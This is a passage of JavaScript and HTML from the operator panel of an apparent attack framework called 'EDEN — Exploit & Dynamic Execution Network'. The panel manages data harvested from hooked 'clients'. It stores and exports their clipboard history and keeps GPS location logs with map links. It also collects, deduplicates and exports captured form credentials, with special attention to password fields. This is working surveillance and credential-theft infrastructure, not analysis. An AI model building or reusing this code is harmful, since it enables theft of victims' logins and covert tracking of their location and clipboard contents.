        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --primary: #0066ff;
                --primary-light: #4d94ff;
                --secondary: #003380;
                --accent: #00ccff;
                --border: #99c2ff;
                --gray-50: #f9fafb;
                --gray-100: #f3f4f6;
                --gray-200: #e5e7eb;
                --gray-500: #6b7280;
                --gray-700: #374151;
                --gray-800: #1f2937;
            }
            
            * {margin: 0; padding: 0; box-sizing: border-box;}
            
            body {
                font-family: 'Poppins', sans-serif;
                line-height: 1.6;
                color: var(--gray-800);
                background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
                margin: 0;
                padding: 0;
                overflow-x: hidden;
                width: 100%;
            }
            
            .container {max-width: 1200px; margin: 0 auto; padding: 2rem;}
            
            /* Header */
            .header {
                background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
                color: white;
                padding: 40px 0;
                position: relative;
                overflow: hidden;
                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
                border-bottom: 1px solid gold;
            }
            
            .header::before {
                content: '';
                position: absolute;
                top: 0; left: 0; right: 0; bottom: 0;
                background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTQ0MCIgaGVpZ2h0PSI0MDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGRlZnM+PGxpbmVhckdyYWRpZW50IHgxPSIwJSIgeTE9IjAlIiB4Mj0iMTAwJSIgeTI9IjEwMCUiIGlkPSJhIj48c3RvcCBzdG9wLWNvbG9yPSIjRkZGIiBzdG9wLW9wYWNpdHk9Ii4wNSIgb2Zmc2V0PSIwJSIvPjxzdG9wIHN0b3AtY29sb3I9IiNGRkYiIHN0b3Atb3BhY2l0eT0iLjEiIG9mZnNldD0iMTAwJSIvPjwvbGluZWFyR3JhZGllbnQ+PC9kZWZzPjxwYXRoIGQ9Ik0wIDQwMFYyMDBzMTAwLTUwIDIwMC01MHMxMDAgNTAgMjAwIDUwIDEwMC01MCAyMDAtNTAgMTAwIDUwIDIwMCA1MCAxMDAtNTAgMjAwLTUwIDEwMCA1MCAyMDAgNTAgMTAwLTUwIDIwMC01MHYyMDBIMHoiIGZpbGw9InVybCgjYSkiIGZpbGwtcnVsZT0iZXZlbm9kZCIgZmlsbC1vcGFjaXR5PSIuNCIvPjwvc3ZnPg==') bottom center no-repeat;
                background-size: cover;
                opacity: 0.3;
                z-index: 0;
            }
            
            .header-content {
                max-width: 1200px;
                margin: 0 auto;
                padding: 0 30px;
                position: relative;
                z-index: 1;
                display: flex;
                justify-content: center;
            }
            
            .header-left {
                display: flex;
                flex-direction: column;
                align-items: center;
                text-align: center;
            }
            
            .logo-text h1 {
                font-size: 36px;
                font-weight: 700;
                margin: 0;
                letter-spacing: 1px;
                text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            }
            
            .logo-text .tagline {
                font-size: 18px;
                opacity: 0.9;
                font-weight: 400;
                margin-top: 5px;
            }
            
            .header-subtitle {
                font-size: 1.2rem;
                margin-top: 15px;
                font-weight: 500;
            }
            
            .timestamp {
                display: inline-block;
                background-color: rgba(255, 255, 255, 0.2);
                padding: 8px 15px;
                border-radius: 50px;
                font-size: 14px;
                font-weight: 500;
                margin-top: 20px;
                backdrop-filter: blur(5px);
            }
            
            /* Clipboard Content */
            .client-container {
                background-color: white;
                border-radius: 16px;
                box-shadow: 0 5px 15px rgba(0, 26, 64, 0.1);
                padding: 0;
                margin-bottom: 30px;
                border: 1px solid var(--border);
                overflow: hidden;
                transition: all 0.3s ease;
            }
            
            .client-container:hover {
                transform: translateY(-5px);
                box-shadow: 0 10px 20px rgba(0, 26, 64, 0.15);
            }
            
            .client-header {
                margin-bottom: 0;
                position: relative;
                padding: 20px 30px;
                border-bottom: 2px solid var(--primary-light);
                background-color: var(--gray-50);
                color: var(--secondary);
                font-weight: 600;
                font-size: 20px;
            }
            
            .clipboard-entry {
                border-bottom: 1px solid var(--gray-200);
                padding: 20px 30px;
            }
            
            .clipboard-entry:last-child {
                border-bottom: none;
            }
            
            .entry-header {
                color: var(--gray-500);
                font-size: 14px;
                margin-bottom: 12px;
                font-weight: 500;
            }
            
            .entry-content {
                white-space: pre-wrap;
                word-break: break-word;
                background-color: var(--gray-50);
                padding: 15px;
                border-radius: 8px;
                font-family: 'Courier New', monospace;
                border: 1px solid var(--gray-200);
                font-size: 14px;
                line-height: 1.5;
            }
            
            /* Author & Footer */
            .author-info {
                display: flex;
                flex-direction: column;
                align-items: center;
                margin-top: 10px;
            }
            
            .author-details {text-align: center;}
            
            .author-name {
                font-size: 24px;
                font-weight: 600;
                margin-bottom: 5px;
                color: var(--secondary);
            }
            
            .author-role {
                font-size: 18px;
                color: var(--primary);
                margin-bottom: 15px;
            }
            
            .social-links {
                display: flex;
                gap: 15px;
                margin-top: 10px;
                justify-content: center;
            }
            
            .social-link {
                width: 40px;
                height: 40px;
                border-radius: 50%;
                background-color: var(--primary-light);
                color: white;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 18px;
                transition: all 0.3s ease;
                text-decoration: none;
            }
            
            .social-link:hover {
                background-color: white;
                color: var(--primary);
                transform: translateY(-3px);
            }
            
            .footer-container {
                background-color: white;
                color: var(--gray-800);
                padding: 15px 0;
                border-top: 1px solid var(--gray-200);
                width: 100%;
                box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.05);
                left: 0;
                right: 0;
                position: relative;
            }
            
            .footer-content {
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                gap: 10px;
                max-width: 1200px;
                margin: 0 auto;
                padding: 0 20px;
            }
            
            .footer-text {
                text-align: center;
                font-size: 18px;
                color: var(--secondary);
            }
            
            .copyright {
                text-align: center;
                padding-top: 10px;
                margin-top: 10px;
                border-top: 1px solid var(--gray-200);
                color: var(--gray-500);
                font-size: 14px;
                width: 100%;
            }
            
            /* Responsive */
            @media (max-width: 768px) {
                .container {padding: 1rem;}
                .header-content {padding: 0 15px;}
                .logo-text h1 {font-size: 28px;}
                .client-header {padding: 15px 20px;}
                .clipboard-entry {padding: 15px 20px;}
            }
            
            @media print {
                body {background-color: white;}
                .client-container {
                    box-shadow: none;
                    margin-bottom: 30px;
                    page-break-inside: avoid;
                }
                .header {background: var(--primary) !important; -webkit-print-color-adjust: exact; print-color-adjust: exact;}
                .footer-container {background: white !important; -webkit-print-color-adjust: exact; print-color-adjust: exact;}
            }
        </style>
    </head>
    <body>
        <header class="header">
            <div class="header-content">
                <div class="header-left">
                    <div class="logo-text">
                        <h1>EDEN</h1>
                        <div class="tagline">Exploit & Dynamic Execution Network</div>
                    </div>
                    <div class="header-subtitle">Clipboard History Export</div>
                    <span class="timestamp">Generated: ${new Date().toLocaleString()}</span>
                </div>
            </div>
        </header>
        
        <div class="container">`;
            
            // Process each client
            Object.keys(clipboardData).forEach(clientId => {
                const clientData = clipboardData[clientId];
                const displayName = clientData.displayName || clientId;
                
                html += `
            <div class="client-container">
                <div class="client-header">${displayName}</div>`;
                
                // Process entries
                if (Array.isArray(clientData)) {
                    clientData.forEach(entry => {
                        if (entry.timestamp && entry.content) {
                            const timestamp = new Date(entry.timestamp).toLocaleString();
                            html += `
                <div class="clipboard-entry">
                    <div class="entry-header">Captured: ${timestamp}</div>
                    <div class="entry-content">${entry.content}</div>
                </div>`;
                        }
                    });
                }
                
                html += `
            </div>`;
            });
            
            html += `
        </div>
        
        <div class="footer-container">
            <div class="footer-content">
                <div class="footer-text">
                    <p>Exported from EDEN</p>
                </div>
                <div class="author-info">
                    <div class="author-details">
                        <div class="author-name">Varun</div>
                        <div class="author-role">Red Teamer | Web Penetration Tester | Ethical Hacker</div>
                        <div class="social-links">
                            <a href="https://www.linkedin.com/in/varun-‎-775a77310" target="_blank" class="social-link" title="LinkedIn">
                                <i class="fab fa-linkedin-in"></i>
                            </a>
                            <a href="https://github.com/mr-pentest" target="_blank" class="social-link" title="GitHub">
                                <i class="fab fa-github"></i>
                            </a>
                            <a href="#" class="social-link" title="Twitter">
                                <i class="fab fa-twitter"></i>
                            </a>
                            <a href="#" class="social-link" title="Discord">
                                <i class="fab fa-discord"></i>
                            </a>
                            <a href="#" class="social-link" title="Instagram">
                                <i class="fab fa-instagram"></i>
                            </a>
                        </div>
                    </div>
                </div>
                <div class="copyright">
                    <p>© ${new Date().getFullYear()} EDEN Security | Developed by Varun</p>
                </div>
            </div>
        </div>
    </body>
    </html>`;
            
            return html;
        }
        
        // Export all clipboard history
        function exportClipboardHistory() {
            // Get clipboard data
            const clipboardData = clipboardHistory.data;
            
            if (Object.keys(clipboardData).length === 0) {
                alert('No clipboard history to export');
                return;
            }
            
            try {
                // Get selected format
                const formatSelect = document.getElementById('clipboardExportFormatSelect');
                const format = formatSelect ? formatSelect.value : 'json';
                
                // Export in the selected format
                switch(format) {
                    case 'pdf':
                        exportClipboardAsPdf(clipboardData);
                        break;
                    case 'html':
                        exportClipboardAsHtml(clipboardData);
                        break;
                    case 'txt':
                        exportClipboardAsTxt(clipboardData);
                        break;
                    case 'json':
                    default:
                        exportClipboardAsJson(clipboardData);
                        break;
                }
            } catch (error) {
                console.error('Error exporting clipboard history:', error);
                alert('Failed to export clipboard history: ' + error.message);
            }
        }
        
        // Location history management
        const locationHistory = {
            // Store location data by client
            data: {},
            
            // Initialize from localStorage
            init: function() {
                try {
                    const savedData = localStorage.getItem('locationHistory');
                    if (savedData) {
                        this.data = JSON.parse(savedData);
                    }
                } catch (e) {
                    console.error('Error loading location history:', e);
                    this.data = {};
                }
            },
            
            // Add a new location entry
            add: function(clientId, locationData) {
                // Initialize client array if needed
                if (!this.data[clientId]) {
                    this.data[clientId] = [];
                }
                
                // Add new entry (newest first)
                this.data[clientId].unshift(locationData);
                
                // Limit to 10 entries per client
                if (this.data[clientId].length > 10) {
                    this.data[clientId] = this.data[clientId].slice(0, 10);
                }
                
                // Save to localStorage
                this.save();
                
                // Update UI
                this.renderHistory();
            },
            
            // Remove entries for a specific client
            removeClient: function(clientId) {
                if (this.data[clientId]) {
                    delete this.data[clientId];
                    this.save();
                    this.renderHistory();
                    return true;
                }
                return false;
            },
            
            // Remove a specific entry
            removeEntry: function(clientId, index) {
                if (this.data[clientId] && this.data[clientId][index]) {
                    this.data[clientId].splice(index, 1);
                    
                    // Remove client if no entries left
                    if (this.data[clientId].length === 0) {
                        delete this.data[clientId];
                    }
                    
                    this.save();
                    this.renderHistory();
                    return true;
                }
                return false;
            },
            
            // Clear all history
            clearAll: function() {
                this.data = {};
                this.save();
                this.renderHistory();
            },
            
            // Save to localStorage
            save: function() {
                try {
                    localStorage.setItem('locationHistory', JSON.stringify(this.data));
                } catch (e) {
                    console.error('Error saving location history:', e);
                }
            },
            
            // Render location history to UI
            renderHistory: function() {
                const container = document.getElementById('locationHistory');
                if (!container) return;
                
                // Clear container
                container.innerHTML = '';
                
                // Check if we have any history
                if (Object.keys(this.data).length === 0) {
                    container.innerHTML = `
                        <div style="text-align: center; padding: 20px; background: #f8f9fa; border-radius: 8px;">
                            <i class="fas fa-map-marker-alt" style="font-size: 2rem; color: #aaa; margin-bottom: 10px;"></i>
                            <p>No location history yet</p>
                        </div>
                    `;
                    return;
                }
                
                // Sort clients by oldest entry first
                const sortedClients = Object.keys(this.data).sort((a, b) => {
                    const aOldest = this.data[a].length > 0 ? 
                        Math.min(...this.data[a].map(entry => new Date(entry.timestamp).getTime())) : Infinity;
                    const bOldest = this.data[b].length > 0 ? 
                        Math.min(...this.data[b].map(entry => new Date(entry.timestamp).getTime())) : Infinity;
                    return aOldest - bOldest;
                });
                
                // Create client containers
                sortedClients.forEach(clientId => {
                    // Skip if no entries
                    if (!this.data[clientId] || this.data[clientId].length === 0) return;
                    
                    // Get display name (nickname) if available
                    let displayName = clientId;
                    
                    // First check if we have a stored displayName for this client
                    if (this.data[clientId][0] && this.data[clientId][0].displayName) {
                        displayName = this.data[clientId][0].displayName;
                    } 
                    // If not, try to find in clients object
                    else {
                        for (const key in clients) {
                            if (clients[key].clientId === clientId && clients[key].nickname) {
                                displayName = clients[key].nickname;
                                break;
                            }
                        }
                        
                        // If still not found, try with shortened ID
                        if (displayName === clientId && clientId.includes('_')) {
                            const shortId = clientId.split('_').pop().substring(0, 8);
                            for (const key in clients) {
                                if (clients[key].clientId && 
                                    clients[key].clientId.includes(shortId) && 
                                    clients[key].nickname) {
                                    displayName = clients[key].nickname;
                                    break;
                                }
                            }
                        }
                    }
                    
                    // Create client container
                    const clientContainer = document.createElement('div');
                    clientContainer.className = 'location-client-container';
                    clientContainer.style.border = '1px solid #ddd';
                    clientContainer.style.borderRadius = '8px';
                    clientContainer.style.marginBottom = '20px';
                    clientContainer.style.overflow = 'hidden';
                    
                    // Create header
                    const header = document.createElement('div');
                    header.className = 'location-client-header';
                    header.style.padding = '15px';
                    header.style.backgroundColor = '#f1f5f9';
                    header.style.display = 'flex';
                    header.style.justifyContent = 'space-between';
                    header.style.alignItems = 'center';
                    header.style.cursor = 'pointer';
                    header.innerHTML = `
                        <div style="font-weight: bold;">Client: ${displayName}</div>
                        <div>
                            <button class="location-btn" style="padding: 5px 10px; background: #dc3545; color: white; border: none; border-radius: 4px; cursor: pointer;" 
                                    onclick="event.stopPropagation(); locationHistory.removeClient('${clientId}')">
                                <i class="fas fa-trash"></i> Clear
                            </button>
                        </div>
                    `;
                    clientContainer.appendChild(header);
                    
                    // Create entries container
                    const entriesContainer = document.createElement('div');
                    entriesContainer.className = 'location-entries';
                    entriesContainer.style.maxHeight = '300px';
                    entriesContainer.style.overflowY = 'auto';
                    
                    // Add entries in chronological order (newest first)
                    this.data[clientId].forEach((entry, idx) => {
                        const entryElement = document.createElement('div');
                        entryElement.className = 'location-entry';
                        entryElement.style.padding = '15px';
                        entryElement.style.borderBottom = '1px solid #eee';
                        
                        // Format date
                        const date = new Date(entry.timestamp);
                        const formattedDate = `${date.toLocaleDateString()} ${date.toLocaleTimeString()}`;
                        
                        // Format coordinates
                        const lat = entry.coords.latitude;
                        const lng = entry.coords.longitude;
                        const accuracy = entry.coords.accuracy || 'Unknown';
                        const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
                        
                        // Add entry content
                        entryElement.innerHTML = `
                            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
                                <div style="font-weight: bold;">#${idx + 1}</div>
                                <div style="color: #666; font-size: 0.9em;">${formattedDate}</div>
                                <button class="location-btn-delete" style="background: none; border: none; color: #dc3545; cursor: pointer;"
                                        onclick="locationHistory.removeEntry('${clientId}', ${idx})">
                                    <i class="fas fa-times"></i>
                                </button>
                            </div>
                            <div style="margin-bottom: 5px;"><b>Coordinates:</b> ${lat}, ${lng}</div>
                            <div style="margin-bottom: 5px;"><b>Accuracy:</b> ${accuracy} meters</div>
                            <div style="margin-top: 10px;">
                                <a href="${mapsUrl}" target="_blank" style="display: inline-block; padding: 5px 10px; background: #28a745; color: white; border-radius: 4px; text-decoration: none;">
                                    <i class="fas fa-map-marker-alt"></i> View on Google Maps
                                </a>
                            </div>
                        `;
                        
                        // Add to entries container
                        entriesContainer.appendChild(entryElement);
                    });
                    
                    // Add entries to client container
                    clientContainer.appendChild(entriesContainer);
                    
                    // Toggle expand/collapse on header click
                    header.addEventListener('click', function() {
                        const currentDisplay = entriesContainer.style.display;
                        entriesContainer.style.display = currentDisplay === 'none' ? 'block' : 'none';
                    });
                    
                    // Add to main container
                    container.appendChild(clientContainer);
                });
            }
        };
        
        // Function to add location to history
        function addLocationToHistory(clientId, locationData) {
            locationHistory.add(clientId, locationData);
        }
        
        // Function to clear all location history
        function clearAllLocationHistory() {
            if (confirm('Are you sure you want to clear all location history?')) {
                locationHistory.clearAll();
                showStatusMessage('success', 'All location history has been cleared');
            }
        }
        
        // Load clipboard and location history on page load
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(() => {
                clipboardHistory.renderHistory();
                locationHistory.init();
                locationHistory.renderHistory();
                // Update client display names to use nicknames for all containers
                updateClientDisplayNames();
            }, 500);
        });

        // Client selection listener removed
        
        // Load credentials from localStorage
        function loadStoredCredentials() {
            try {
                const storedCredentials = localStorage.getItem('eden_credentials');
                if (storedCredentials) {
                    capturedCredentials = JSON.parse(storedCredentials);
                    updateCredentialsUI();
                }
            } catch (error) {
                console.error('Error loading credentials:', error);
            }
        }
        
        // Save credentials to localStorage
        function saveCredentialsToStorage() {
            try {
                localStorage.setItem('eden_credentials', JSON.stringify(capturedCredentials));
            } catch (error) {
                console.error('Error saving credentials:', error);
            }
        }
        
        // Add credential data
        function addCredentials(credentialData) {
            // Skip empty form submissions (where all values are empty)
            if (credentialData.data) {
                let hasNonEmptyValue = false;
                for (const key in credentialData.data) {
                    if (credentialData.data[key] && credentialData.data[key].trim() !== '') {
                        hasNonEmptyValue = true;
                        break;
                    }
                }
                
                // Skip if all values are empty
                if (!hasNonEmptyValue) {
                    console.log('Skipping empty form submission');
                    return;
                }
                
                // Check form metadata for password fields
                if (credentialData.formMetadata && credentialData.formMetadata.hasPassword) {
                    console.log('Form contains password fields, ensuring capture');
                    hasNonEmptyValue = true;
                }
                
                // Check for duplicates (same data from same client within last 5 seconds)
                const now = new Date().getTime();
                const fiveSecondsAgo = now - 5000;
                
                // Check recent submissions
                const isDuplicate = capturedCredentials.some(cred => {
                    const credTime = new Date(cred.timestamp).getTime();
                    if (credTime < fiveSecondsAgo) return false; // Too old to be a duplicate
                    
                    // Same client?
                    if (cred.clientId !== credentialData.clientId) return false;
                    
                    // Similar data?
                    let sameDataCount = 0;
                    let totalFields = 0;
                    
                    for (const key in credentialData.data) {
                        totalFields++;
                        if (cred.data[key] === credentialData.data[key]) {
                            sameDataCount++;
                        }
                    }
                    
                    // If 75% of fields match, consider it a duplicate
                    return totalFields > 0 && (sameDataCount / totalFields) > 0.75;
                });
                
                if (isDuplicate) {
                    console.log('Skipping duplicate submission');
                    return;
                }
            } else {
                // Skip if no data at all
                return;
            }
            
                            // Create a credential object with timestamp
            const credential = {
                id: 'cred_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9),
                timestamp: credentialData.timestamp || new Date().toISOString(),
                url: credentialData.url || 'Unknown',
                formId: credentialData.formId || 'Unknown',
                clientId: credentialData.clientId || 'Unknown',
                ip: credentialData.ip || 'Unknown',
                source: credentialData.source || '',
                data: credentialData.data || {},
                formMetadata: credentialData.formMetadata || {}
            };
            
            // Add to beginning of array
            capturedCredentials.unshift(credential);
            
            // Limit to 50 entries
            if (capturedCredentials.length > 50) {
                capturedCredentials = capturedCredentials.slice(0, 50);
            }
            
            // Update UI and save
            updateCredentialsUI();
            saveCredentialsToStorage();
        }
        
        // Clear all credentials
        function clearAllCredentials() {
            if (confirm('Are you sure you want to clear all captured credentials?')) {
                capturedCredentials = [];
                updateCredentialsUI();
                saveCredentialsToStorage();
            }
        }
        
        // Get all selected credential IDs
        function getSelectedCredentials() {
            const selectedCheckboxes = document.querySelectorAll('.credential-select-checkbox:checked');
            const selectedIds = Array.from(selectedCheckboxes).map(checkbox => {
                const cardId = checkbox.id.replace('select-', '');
                return cardId;
            });
            
            return selectedIds;
        }
        
        // Update export button state
        function updateExportButtonState() {
            const selectedCount = document.querySelectorAll('.credential-select-checkbox:checked').length;
            const exportBtn = document.getElementById('exportCredentialsBtn');
            
            if (exportBtn) {
                if (selectedCount > 0) {
                    exportBtn.innerHTML = `<i class="fas fa-file-export" style="margin-right: 5px;"></i> Export (${selectedCount})`;
                } else {
                    exportBtn.innerHTML = `<i class="fas fa-file-export" style="margin-right: 5px;"></i> Export All`;
                }
            }
        }
        
       
        // Create PDF export
        function exportAsPdf(credentials) {
            // We'll need to load the jsPDF library
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js';
            script.onload = function() {
                const script2 = document.createElement('script');
                script2.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.28/jspdf.plugin.autotable.min.js';
                script2.onload = generatePDF;
                document.head.appendChild(script2);
            };
            document.head.appendChild(script);
            
            function generatePDF() {
                try {
                    const { jsPDF } = window.jspdf;
                    const doc = new jsPDF();
                    
                    // Title
                    doc.setFontSize(16);
                    doc.text("Eden Credentials Export", 14, 15);
                    
                    // Add timestamp
                    const timestamp = new Date().toLocaleString();
                    doc.setFontSize(10);
                    doc.text(`Generated: ${timestamp}`, 14, 22);
                    
                    // Loop through each credential and add to the PDF
                    let yPos = 30;
                    
                    credentials.forEach((cred, index) => {
                        // Check if we need a new page
                        if (yPos > 250) {
                            doc.addPage();
                            yPos = 20;
                        }
                        
                        // Add credential header
                        doc.setFontSize(12);
                        doc.setTextColor(44, 62, 80);
                        doc.text(`Credential #${index + 1}`, 14, yPos);
                        yPos += 7;
                        
                        // Add timestamp
                        doc.setFontSize(10);
                        doc.setTextColor(100, 100, 100);
                        let formattedDate;
                        try {
                            formattedDate = new Date(cred.timestamp).toLocaleString();
                        } catch (e) {
                            formattedDate = 'Unknown';
                        }
                        doc.text(`Captured: ${formattedDate}`, 14, yPos);
                        yPos += 5;
                        
                        // Add URL and client ID
                        doc.text(`URL: ${cred.url || 'Unknown'}`, 14, yPos);
                        yPos += 5;
                        doc.text(`Client ID: ${cred.clientId || 'Unknown'}`, 14, yPos);
                        yPos += 5;
                        doc.text(`IP: ${cred.ip || 'Unknown'}`, 14, yPos);
                        yPos += 8;
                        
                        // Add credential data
                        if (cred.data && Object.keys(cred.data).length > 0) {
                            // Create a table for the form data
                            const tableData = [];
                            for (const key in cred.data) {
                                tableData.push([key, cred.data[key] || '']);
                            }
                            
                            doc.autoTable({
                                startY: yPos,
                                head: [['Field', 'Value']],
                                body: tableData,
                                theme: 'striped',
                                headStyles: {
                                    fillColor: [52, 152, 219],
                                    textColor: [255, 255, 255]
                                },
                                margin: { left: 14, right: 14 },
                                styles: { fontSize: 10 }
                            });
                            
                            yPos = doc.previousAutoTable.finalY + 15;
                        } else {
                            yPos += 5;
                            doc.text("No credential data available", 14, yPos);
                            yPos += 15;
                        }
                        
                        // Add a separator
                        doc.setDrawColor(200, 200, 200);
                        doc.line(14, yPos - 8, 196, yPos - 8);
                    });
                    
                    // Save the PDF
                    const fileName = `eden_credentials.pdf`;
                    doc.save(fileName);
                    
                                    
                } catch (error) {
                    console.error('Error generating PDF:', error);
                    alert('Failed to generate PDF: ' + error.message);
                }
            }
        }
        
        // Create HTML export
        function exportAsHtml(credentials) {
    // Create HTML header
    let html = `<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>EDEN Credentials Export</title>
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            :root {
                --primary: #0066ff;
                --primary-light: #4d94ff;
                --secondary: #003380;
                --accent: #00ccff;
                --border: #99c2ff;
                --gray-50: #f9fafb;
                --gray-100: #f3f4f6;
                --gray-200: #e5e7eb;
                --gray-500: #6b7280;
                --gray-700: #374151;
                --gray-800: #1f2937;
            }
            
            * {margin: 0; padding: 0; box-sizing: border-box;}
            
            body {
                font-family: 'Poppins', sans-serif;
                line-height: 1.6;
                color: var(--gray-800);
                background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
                margin: 0;
                padding: 0;
                overflow-x: hidden;
                width: 100%;
            }
            
            .container {max-width: 1200px; margin: 0 auto; padding: 2rem;}
            
            /* Header */
            .header {
                background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
                color: white;
                padding: 40px 0;
                position: relative;
                overflow: hidden;
                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
                border-bottom: 1px solid gold;
            }
            
            .header::before {
                content: '';
                position: absolute;
                top: 0; left: 0; right: 0; bottom: 0;
                background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTQ0MCIgaGVpZ2h0PSI0MDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGRlZnM+PGxpbmVhckdyYWRpZW50IHgxPSIwJSIgeTE9IjAlIiB4Mj0iMTAwJSIgeTI9IjEwMCUiIGlkPSJhIj48c3RvcCBzdG9wLWNvbG9yPSIjRkZGIiBzdG9wLW9wYWNpdHk9Ii4wNSIgb2Zmc2V0PSIwJSIvPjxzdG9wIHN0b3AtY29sb3I9IiNGRkYiIHN0b3Atb3BhY2l0eT0iLjEiIG9mZnNldD0iMTAwJSIvPjwvbGluZWFyR3JhZGllbnQ+PC9kZWZzPjxwYXRoIGQ9Ik0wIDQwMFYyMDBzMTAwLTUwIDIwMC01MHMxMDAgNTAgMjAwIDUwIDEwMC01MCAyMDAtNTAgMTAwIDUwIDIwMCA1MCAxMDAtNTAgMjAwLTUwIDEwMCA1MCAyMDAgNTAgMTAwLTUwIDIwMC01MHYyMDBIMHoiIGZpbGw9InVybCgjYSkiIGZpbGwtcnVsZT0iZXZlbm9kZCIgZmlsbC1vcGFjaXR5PSIuNCIvPjwvc3ZnPg==') bottom center no-repeat;
                background-size: cover;
                opacity: 0.3;
                z-index: 0;
            }
            
            .header-content {
                max-width: 1200px;
                margin: 0 auto;
                padding: 0 30px;
                position: relative;
                z-index: 1;
                display: flex;
                justify-content: center;
            }
            
            .header-left {
                display: flex;
                flex-direction: column;
                align-items: center;
                text-align: center;
            }
            
            .logo-text h1 {
                font-size: 36px;
                font-weight: 700;
                margin: 0;
                letter-spacing: 1px;
                text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            }
            
            .logo-text .tagline {
                font-size: 18px;
                opacity: 0.9;
                font-weight: 400;
                margin-top: 5px;
            }
            
            .header-subtitle {
                font-size: 1.2rem;
                margin-top: 15px;
                font-weight: 500;
            }
            
            .timestamp {
                display: inline-block;
                background-color: rgba(255, 255, 255, 0.2);
                padding: 8px 15px;
                border-radius: 50px;
                font-size: 14px;
                font-weight: 500;
                margin-top: 20px;
                backdrop-filter: blur(5px);
            }
            
            /* Credentials Section */
            .credentials-grid {
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(500px, 1fr));
                gap: 30px;
                margin: 40px 0;
            }
            
            .credential-card {
                background-color: white;
                border-radius: 16px;
                box-shadow: 0 5px 15px rgba(0, 26, 64, 0.1);
                padding: 0;
                margin-bottom: 30px;
                border: 1px solid var(--border);
                overflow: hidden;
                transition: all 0.3s ease;
            }
            
            .credential-card:hover {transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0, 26, 64, 0.15);}
            
            .credential-header {
                margin-bottom: 25px;
                position: relative;
                padding: 20px 30px;
                border-bottom: 2px solid var(--primary-light);
                background-color: white;
            }
            
            .credential-title {
                font-size: 24px;
                font-weight: 600;
                color: var(--secondary);
                margin: 0;
                display: flex;
                align-items: center;
            }
            
            .credential-content {padding: 0 30px 30px;}
            
            .credential-metadata {
                background-color: var(--gray-50);
                padding: 20px;
                border-radius: 10px;
                margin-bottom: 25px;
                border: 1px solid var(--gray-200);
            }
            
            .meta-item {
                display: flex;
                margin-bottom: 12px;
                align-items: flex-start;
            }
            
            .meta-item:last-child {margin-bottom: 0;}
            
            .meta-label {
                flex: 0 0 100px;
                font-weight: 600;
                color: var(--secondary);
            }
            
            .meta-value {
                flex: 1;
                color: var(--gray-700);
                word-break: break-word;
            }
            
            .data-section {margin-top: 25px;}
            
            .data-section h3 {
                font-size: 18px;
                margin-bottom: 15px;
                color: var(--secondary);
                padding-bottom: 8px;
                border-bottom: 2px solid var(--primary-light);
                display: inline-block;
            }
            
            .data-table {
                width: 100%;
                border-collapse: separate;
                border-spacing: 0;
                border-radius: 10px;
                overflow: hidden;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
            }
            
            .data-table th {
                background-color: var(--gray-100);
                text-align: left;
                padding: 15px;
                font-weight: 600;
                color: var(--secondary);
                font-size: 16px;
            }
            
            .data-table td {
                padding: 15px;
                border-top: 1px solid var(--gray-200);
                color: var(--gray-800);
                font-size: 15px;
            }
            
            .data-table tr:nth-child(even) td {background-color: var(--gray-50);}
            
            .data-table .field-name {
                font-weight: 600;
                width: 30%;
                color: var(--secondary);
            }
            
            /* Author & Footer */
            .author-info {
                display: flex;
                flex-direction: column;
                align-items: center;
                margin-top: 10px;
            }
            
            .author-details {text-align: center;}
            
            .author-name {
                font-size: 24px;
                font-weight: 600;
                margin-bottom: 5px;
                color: var(--secondary);
            }
            
            .author-role {
                font-size: 18px;
                color: var(--primary);
                margin-bottom: 15px;
            }
            
            .social-links {
                display: flex;
                gap: 15px;
                margin-top: 10px;
                justify-content: center;
            }
            
            .social-link {
                width: 40px;
                height: 40px;
                border-radius: 50%;
                background-color: var(--primary-light);
                color: white;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 18px;
                transition: all 0.3s ease;
                text-decoration: none;
            }
            
            .social-link:hover {
                background-color: white;
                color: var(--primary);
                transform: translateY(-3px);
            }
            
            .footer-container {
                background-color: white;
                color: var(--gray-800);
                padding: 15px 0;
                border-top: 1px solid var(--gray-200);
                width: 100%;
                box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.05);
                left: 0;
                right: 0;
                position: relative;
            }
            
            .footer-content {
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                gap: 10px;
                max-width: 1200px;
                margin: 0 auto;
                padding: 0 20px;
            }
            
            .footer-text {
                text-align: center;
                font-size: 18px;
                color: var(--secondary);
            }
            
            .copyright {
                text-align: center;
                padding-top: 10px;
                margin-top: 10px;
                border-top: 1px solid var(--gray-200);
                color: var(--gray-500);
